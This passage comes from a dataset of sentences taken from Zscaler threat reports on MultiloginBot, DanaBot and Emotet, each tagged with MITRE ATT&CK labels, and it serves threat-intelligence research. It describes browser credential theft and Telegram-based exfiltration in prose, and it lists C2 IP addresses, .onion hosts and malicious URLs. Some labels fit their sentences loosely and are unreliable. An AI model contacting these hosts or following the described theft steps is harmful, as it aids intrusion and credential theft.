"zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Before starting stealing activities, the malware checks the required folders in the system and then executes its functions to collect information from the compromised machine, explained below:", "labels": ["TA0002", "T1592"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Firstly, the malware collects the IP address by making a web request to \u201c*checkip.dyndns.org*\u201dand stores the collected information at \u201c**<Installation\\_Path>\\Item\\IPAddress\\IPAddress.txt****\u201d,** in the format **<IP\\_Address>:<Country\\_Name>,** asexplainedin the below snippet**.**", "labels": ["T1049"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "It is to be noted that the above code also acts as a checkpoint for an internet connection--that is, if the malware doesn\u2019t get a response, then the malware crashes.", "labels": ["T1049"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "***2.User\u2019s Login data:***", "labels": ["TA0006"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "The steps to gather the login data of the user are as follows:", "labels": ["TA0006"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* Creates a copy of existing login data file to the destination file that is named as \u2018C:\\LoginData0\u2019 in this case.", "labels": ["T1003"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* The below snippet shows how the SQL query is being executed against the newly created i.e **C:\\LoginData0** file to carve out the login information.", "labels": ["T1003"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "And then the information is decrypted and stored in a new file placed at **<Installation\\_Path>\\Item\\Password\\<Browser\\_name>Profile\\_<Integer>\\_PASSWORD.txt>**.", "labels": ["T1074"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* The login data contains passwords in an encrypted format, so the malware first gets the key, which shall be used further to decrypt the encrypted password.", "labels": ["T1140"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* After getting the key and the encrypted data, the malware will decrypt them by using the below code.", "labels": ["T1140"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* The below snippet shows the format in which malware will store the user login data information.", "labels": ["T1074"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "The malware uses a similar mechanism to the one explained above to collect autofill and cookies information and stores the respective data in a file placed at **<Installation\\_Path>\\Item\\Autofill\\<Browser\\_name>Profile\\_<Integer>\\_AUTOFILL.txt>** and **<Installation\\_Path>\\Item\\cookies\\<Browser\\_name>Profile\\_<Integer>\\_cookies.txt>,** respectively.", "labels": ["T1606", "T1074"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "The below table depicts the targeted file and the sql queries used to extract the information.", "labels": ["T1005"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "The below snippet shows the format in which malware will store the related information.", "labels": ["T1074"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "**Note:-** *Similar code and logic is there for stealing information from other browsers (except Firefox).", "labels": ["T1606"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "In the case of Firefox, the malware targets *cookies.sqlite, signons.sqlite* and *logins.json* files to carve out the sensitive information and stores the data in **<Installation\\_Path>\\Item\\cookies\\FFProfile\\_Cookies.txt** and **<Installation\\_Path>\\Item\\Password\\FFProfile\\_PASSWORD\\_.txt** respectively.", "labels": ["T1606", "T1074"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "After stealing all the data from different browsers, the malware then creates a zip file which shall be sent to the command and control (C2) server.", "labels": ["TA0011", "TA0011", "T1041"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "After zip creation, in order to transfer the zip file, the malware initiates C2 communication to its Telegram bot, using a hard-coded token.", "labels": ["TA0011", "T1560", "T1102"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "After successfully performing the stealing activities, in order to leave no trace, the malware displays a pop-up with a false message to update the application and asks the user for confirmation to proceed ahead.", "labels": ["TA0010", "T1070"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Once the user responds, then the malware opens a legitimate link in the foreground and deletes the created zip file in the background, irrespective of the option chosen by the user.", "labels": ["T1070"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1584 | Compromise Infrastructure |", "labels": ["T1584"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1547 | Boot or Autostart Execution |", "labels": ["T1547"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1555 | Credentials from Password Stores |", "labels": ["T1555", "T1555"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1567 | Exfiltration over Web Services |", "labels": ["T1567"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1114 | Email Collection |", "labels": ["T1114"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1560 | Archive Collected Data |", "labels": ["T1560"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "| T1606 | Forge Web Credentials |", "labels": ["T1606"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Spike in DanaBot Malware Activity", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "* Two large software supply chain attacks distributed the DanaBot malware.", "labels": ["T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "* DanaBot is a malware-as-a-service platform discovered in 2018 that focuses on credential theft and banking fraud.", "labels": ["TA0010"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "* DanaBot\u2019s popularity has waned in recent years, but these campaigns may signal a return of the malware and its affiliates to the threat landscape.", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "The [DanaBot malware](https://malpedia.caad.fkie.fraunhofer.de/details/win.danabot) had a spike in new activity recently, including being distributed via two large software supply chain attacks and being used in a Distributed Denial of Service (DDoS) attack on a Russian language electronics forum.", "labels": ["T1499", "T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "DanaBot, [first discovered](https://www.proofpoint.com/us/threat-insight/post/danabot-new-banking-trojan-surfaces-down-under-0) by Proofpoint in May 2018, is a malware-as-a-service platform where threat actors, known as \u201caffiliates\u201d and identified by \u201caffiliate IDs\u201d, purchase access to the platform from another threat actor who develops the malware and [command and control (C2) panel](https://www.proofpoint.com/us/threat-insight/post/danabot-control-panel-revealed), sets up and maintains the shared C2 infrastructure, and provides sales and customer support.", "labels": ["TA0011", "TA0011", "TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "Affiliates then distribute and use the malware as they see fit--mostly to steal credentials and commit banking fraud.", "labels": ["T1589"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "While it was a prominent banking malware for a number of years and despite a new major update being spotted at the end of 2020 (as documented by [Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/new-year-new-version-danabot), [ESET](https://twitter.com/ESETresearch/status/1420734522581295106), and [LEXFO](https://blog.lexfo.fr/danabot-malware.html)), DanaBot has been relatively quiet in the recent threat landscape.", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "**Large Software Supply Chain Attack (October 22, 2021)**", "labels": ["T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "As reported by the [Cybersecurity and Infrastructure Security Agency (CISA)](https://us-cert.cisa.gov/ncas/current-activity/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js), [GitHub](https://github.com/advisories/GHSA-pjwm-rvh2-c87w), [the developer](https://github.com/faisalman/ua-parser-js/issues/536), and others the NPM JavaScript package for \u201cUAParser.js\u201d was compromised on Friday, October 22, 2021 and used to distribute a cryptocurrency miner and DanaBot.", "labels": ["T1059", "T1059", "T1496"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "[UAParser.js](https://www.npmjs.com/package/ua-parser-js) is a \u201cJavaScript library to detect Browser, Engine, OS, CPU, and Device type/model from User-Agent data with relatively small footprint.", "labels": ["T1059", "T1059", "T1592"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "The DanaBot malware was downloaded from:", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "*Figure 1: DanaBot malware configuration used in supply chain attack*", "labels": ["T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "The malware was also configured with a backup TOR C2:", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "Based on Zscaler ThreatLabz tracking, this is a new affiliate to the DanaBot ecosystem.", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "At the time of the incident, the affiliate had only configured the malware\u2019s credential stealing component to be active--the person-in-the-browser and webinject bank fraud component was not activated.", "labels": ["TA0006"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "While the post-infection intentions of the threat actor aren\u2019t known, given the focus on credentials, the size of the attack, and the crimeware landscape being dominated by initial access brokers selling access to ransomware affiliates, this outcome can\u2019t be ruled out.", "labels": ["TA0001", "T1486"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "**Second Large Software Supply Chain Attack (November 4, 2021)**", "labels": ["T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "As reported by [Twitter](https://twitter.com/nonattributable/status/1456255408201338881), [GitHub](https://github.com/advisories/GHSA-73qr-pfmq-6rp8), and [others](https://github.com/veged/coa/issues/99), another NPM package was compromised and used to distribute DanaBot.", "labels": ["T1059"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "The attack took place on\u00a0 Thursday, November 4, 2021 and it was by the same DanaBot affiliate ID 40 threat actor as in the October 22, 2021 attack on \u201cUAParser.js\u201d.", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "The DanaBot loader component used in this campaign was distributed from:", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "and was used to download a DanaBot main component with the SHA-256 hash of:", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "Similar to the first incident, the threat actor had only configured the malware\u2019s credential stealing component to be active.", "labels": ["TA0006"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "**DDoS Attack on Russian Language Electronics Forum**", "labels": ["T1499"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "DanaBot affiliate ID 4 was also active last week.", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "On Wednesday October 20, 2021, the affiliate configured its DanaBot victims to download and execute a new executable with a SHA-256 hash of:", "labels": ["T1204"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "The downloaded executable is written in the Delphi programming language and its only functionality is to implement a bare-bones HTTP-based DDoS attack on a hardcoded IP address and host.", "labels": ["T1499"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "*Figure 2: HTTP request template used in DDoS attack*", "labels": ["T1499"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "While the popularity and activity of DanaBot has declined in recent years, the UAParser.js and COA software supply chain attacks shows that the malware is still an active threat.", "labels": ["T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "It is currently unclear whether these attacks were a one-off opportunity for a threat actor or whether this and other activity signals the return of DanaBot and its affiliates.", "labels": [], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1586 | Compromise Accounts |", "labels": ["T1586"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1195 | Supply Chain Compromise |", "labels": ["T1195"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1204 | User Execution |", "labels": ["T1204"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1003 | OS Credential Dumping |", "labels": ["T1003"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1539 | Steal Web Session Cookie |", "labels": ["T1539"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1115 | Clipboard Data |", "labels": ["T1115"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1573 | Encrypted Channel |", "labels": ["T1573"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| T1008 | Fallback Channels |", "labels": ["T1008"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 185.158.250.216:443 | October 22, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 194.76.225.46:443 | October 22, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 45.11.180.153:443 | October 22, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 194.76.225.61:443 | October 22, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| bjij7tqwaipwbeig5ubq4xjb6fy7s3lknhkjojo4vdngmqm6namdczad\\.onion | October 22, 2021 affiliate ID 40 configured backup C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 185.117.90.36:443 | November 4, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 193.42.36.59:443 | November 4, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 193.56.146.53:443 | November 4, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 185.106.123.228:443 | November 4, 2021 affiliate ID 40 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 192.119.110.73:443 | Affiliate ID 4 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 192.236.147.159:443 | Affiliate ID 4 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| 192.210.222.88:443 | Affiliate ID 4 configured C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "| gcwr4vcf72vpcrgevcziwb7axooa3n47l57dsiwxvzvcdlt7exsvk5yd.onion | Affiliate ID 4 configured backup C2 |", "labels": ["TA0011"], "document": "zscaler_2021-11-05_spike-danabot-malware-activity"}, {"sentence": "Return of Emotet malware", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "* Emotet is one of the most dangerous, prolific, and long-lasting malware Trojans that has ever existed.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "* In January 2021, a law enforcement action disrupted the Emotet malware and its infrastructure.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "* After almost a year-long hiatus, Emotet has returned to the threat landscape as of Nov 14, 2021.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "* Distribution of the malware was via the TrickBot malware and email campaigns.", "labels": ["S0266", "T1566"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "After an almost year-long hiatus, the prolific malware [Emotet](https://www.zscaler.com/blogs/security-research/emotet-back-action-after-short-break) has returned to the threat landscape.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "An [early report](https://cyber.wtf/2021/11/15/guess-whos-back/) indicated it returned on Sunday November 14, 2021 and it was being distributed via the [TrickBot](https://www.zscaler.com/blogs/security-research/new-trickbot-and-bazarloader-campaigns-use-multiple-delivery-vectors) botnet.", "labels": ["S0266"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "A [later report](https://isc.sans.edu/diary/28044) indicated that it was also being distributed via email campaigns.", "labels": ["T1566"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "The Emotet malware was first detected back in 2014 and it focused on banking fraud.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "In recent years, Emotet pivoted and it became an initial access broker providing victim access for several ransomware groups.", "labels": ["S0367", "TA0001", "T1486"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "In January 2021, [law enforcement](https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action) disrupted the Emotet malware and its infrastructure.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "While the Threatlabz team's technical analysis for the payloads involved is ongoing, the new version of the Emotet malware is similar to its past variants in many aspects.", "labels": ["S0367"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "In our quick analysis, we've observed some changes in the command and control data and encryption used.", "labels": ["TA0011", "T1573"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "It also appears to be using HTTPS instead of\u00a0 plain HTTP for command and control communication.", "labels": ["TA0011", "T1071"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "It looks like most of the functionality is the same as earlier variants, and it will likely pick up where it left off, providing initial access to the ransomware operators.", "labels": ["TA0001", "T1486"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "As we can see from the below screenshot of spam email, Emotet starts by leveraging a 'reply chain' email strategy in their spam campaigns.", "labels": ["S0367", "T1566"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "It has been using MS word document \u201c.docm\u201d, MS excel \u201c.xlsm\u201d and password protected \u201c.zip\u201d files as attachments.", "labels": ["T1566"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1012 | Query Registry |", "labels": ["T1012"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1018 | Remote System Discovery |", "labels": ["T1018"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1036 | Masquerading |", "labels": ["T1036"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1057 | Process Discovery |", "labels": ["T1057"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1083 | File and Directory Discovery |", "labels": ["T1083"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1518 | Security Software Discovery |", "labels": ["T1518"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1547 | LSASS Driver |", "labels": ["T1547"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1218 | Rundll32 |", "labels": ["T1218"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1562 | Disable or Modify Tools |", "labels": ["T1562"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| T1564 | Hidden Files and Directories |", "labels": ["T1564"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| 81.0.236[.]93:44394.177.248[.]64:44366.42.55[.]5:7080103.8.26[.]103:8080185.184.25[.]237:808045.76.176[.]10:8080188.93.125[.]116:8080103.8.26[.]102:8080178.79.147[.]66:808058.227.42[.]236:8045.118.135[.]203:7080103.75.201[.]2:443195.154.133[.]20:44345.142.114[.]231:8080212.237.5[.]209:443207.38.84[.]195:8080104.251.214[.]46:8080138.185.72[.]26:808051.68.175[.]8:8080210.57.217[.]132:8080\u00a051.178.61[.]60:443168.197.250[.]14:8045.79.33[.]48:8080196.44.98[.]190:8080177.72.80[.]14:708051.210.242[.]234:8080185.148.169[.]10:8080142.4.219[.]173:808078.47.204[.]80:44378.46.73[.]125:44337.44.244[.]177:808037.59.209[.]141:8080191.252.103[.]16:8054.38.242[.]185:44385.214.67[.]203:808054.37.228[.]122:443207.148.81[.]119:8080195.77.239[.]39:808066.42.57[.]149:443195.154.146[.]35:443 | Configured C2s |", "labels": ["TA0011"], "document": "zscaler_2021-11-16_return-emotet-malware"}, {"sentence": "| https://evgeniys[.]ru/sap-logs/D6/http://crownadvertising[.]ca/wp-includes/OxiAACCoic/https://cars-taxonomy.mywebartist[.]eu/-/BPCahsAFjwF/http://immoinvest.com[.]br/blog\\_old/wp-admin/luoT/https://yoho[.]love/wp-content/e4laFBDXIvYT6O/https://www.168801[.]xyz/wp-content/6J3CV4meLxvZP/https://www.pasionportufuturo[.]pe/wp-content/XUBS/ | Malicious URLs used in spam campaign, embedded inside \u201c.docm\u201d or \u201c.xlsm\u201d files |", "labels": ["T1566"], "document": "zscaler_2021-11-16_return-emotet-malware"}]